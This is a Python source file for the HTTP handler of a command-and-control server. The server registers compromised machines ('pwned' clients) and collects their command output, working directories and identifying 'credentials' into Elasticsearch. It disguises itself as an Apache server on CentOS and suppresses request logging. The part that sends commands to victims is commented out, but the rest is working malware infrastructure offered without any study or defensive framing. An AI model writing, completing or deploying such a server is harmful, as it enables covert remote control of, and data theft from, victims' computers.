import json
from urllib.parse import unquote_plus
from http.server import BaseHTTPRequestHandler
from server_settings import ES_HANDLER, CONNECTED_CLIENTS, RESPONSE_KEY, CWD_RESPONSE, RESPONSE, CLIENT_CREDENTIALS


class MyHandler(BaseHTTPRequestHandler):

    def __init__(self, *args, **kwargs):
        # Initialize instance variables
        self.current_client_ip = None  # Variable to hold the current client IP after using 'select' command
        self.cmd_request = "/amos?center="
        self.active_session = ""

        # Call the parent class initializer with the given arguments
        super().__init__(*args, **kwargs)

    # Make our c2 server look like an up-to-date Apache server on CentOS
    server_version = "Apache/2.4.58"
    sys_version = "(CentOS)"


    @staticmethod
    def convert_text(text):
            RESET = "\033[0m"
            BOLD = "\033[1m"
            COLOR = "\u001b[36m" 
            return f"{BOLD}{COLOR}{text}{RESET}"


    """Sends the HTTP response code and headers back to the client"""
    def server_response(self, code: int):
        self.send_response(code)
        self.end_headers()


    def do_GET(self):
        try:
            if self.path.startswith(self.cmd_request):
                # Split out the client from the HTTP GET request
                client = self.path.split(self.cmd_request)[1]
                client_account = client.split('@')[0]
                client_hostname = client.split('@')[1]

                if client not in CONNECTED_CLIENTS.values() and not ES_HANDLER.is_client_present(client):
                    client_id = ES_HANDLER.get_client_id("system-name", client_hostname)
                    # Don't forget to handle none response
                    CONNECTED_CLIENTS[client_id] = client_hostname
                    self.server_response(200)
                    print(f"{client_account}@{client_hostname} has been pwned!\n")

                elif ES_HANDLER.is_client_present(client):
                    # Sends the HTTP response code and header back to the client
                    self.server_response(200)
                    print(f"{client_account}@{client_hostname} has reconnected!\n")


                # If the client is in pwned_dict, and it is also our active session:
                elif client in CONNECTED_CLIENTS:
                    print("yes")
                    """
                    # Collect the command to run on the client; set Linux style prompt as well
                    command = input(f"{client_account}@{client_hostname}: ")
                    # Write the command back to the client as a response; must utf-8 encode
                    self.server_response(200)
                    self.wfile.write(command.encode())
                    """

                else:
                    self.server_response(400)

        except Exception as e:
            print("[-]Unable to complete get request!!!")
            print(e)


    # handle post requests
    # noinspection PyPep8Naming
    def do_POST(self):
        """ This method handles all HTTP POST requests that arrive at the c2 server. """
        # Follow this code block when the compromised computer is responding with data to be printed on the screen
        if self.path == RESPONSE:
            print(self.handle_post_data())

        # Follow this code block when the compromised computer is responding with its current working directory
        elif self.path == CWD_RESPONSE:
            global cwd
            cwd = self.handle_post_data()

        # Follow this code block to store client credentials
        elif self.path == CLIENT_CREDENTIALS:
            client_info = json.loads(self.handle_post_data())
            mac_address = client_info["mac-address"]

            if ES_HANDLER.is_client_present(mac_address):
                client_id = ES_HANDLER.get_client_id("mac-address", client_info["mac-address"])
                ES_HANDLER.update_document(client_id, client_info)
                print("[+]Client info has been updated!!!")
            else:
                ES_HANDLER.index_client_data(client_info)

        # Nobody should ever be posting to our c2 server other than to the above paths
        else:
            print(f"Intruder {self.client_address[0]} just accessed {self.path} on the server.\n")


    def handle_post_data(self):
        """Function to handle post data from a client."""
        # Sends the HTTP response code and header back to the client
        self.server_response(200)
        # Get Content-Length value from HTTP Headers
        content_length = int(self.headers.get("Content-Length"))
        # Gather the client's data by reading in the HTTP POST data
        client_data = self.rfile.read(content_length)
        # UTF-8 decode the client's data
        client_data = client_data.decode()
        # Remove the HTTP POST variable and the equal sign from the client's data
        client_data = client_data.replace(f"{RESPONSE_KEY}=", "", 1)
        # HTML/URL decode the client's data and translate '+' to a space
        client_data = unquote_plus(client_data)
        # Return the processed client's data
        return client_data


    def save_file(self, file_path: str, content):
        try:
            with open(file_path, 'wb') as file:
                file.write(content)
            print(f'File saved successfully at {file_path}')
        except Exception as e:
            print(f'Error saving file: {e}')


    def client_info_handler(self, mac_address, client_info):
        #check if client is present
        if ES_HANDLER.is_client_present(mac_address):
            ES_HANDLER.update_document(mac_address, client_info)
        else:
            ES_HANDLER.index_client_data(client_info)
       

    def get_client_id(self, client_ip: str):
        # Get the client ID based on the client's IP address
        if client_ip in CONNECTED_CLIENTS:
            return CONNECTED_CLIENTS[client_ip]
        else:
            # If the client is not in the connected_clients dictionary, generate a new ID
            new_client_id = len(CONNECTED_CLIENTS) + 1
            CONNECTED_CLIENTS[client_ip] = new_client_id
            return new_client_id


    def get_client_ip(self, client_id: int, esHandler):
        try:
            resp = esHandler.es.get(index=esHandler.db_name, id=client_id)
            return resp["_source"]["ip"]
        except Exception as e:
            print(f"An error occurred: {e}")


    def log_request(self, code="-", size="-"):
        """Override BaseHTTPRequestHandler's log_request"""
        return

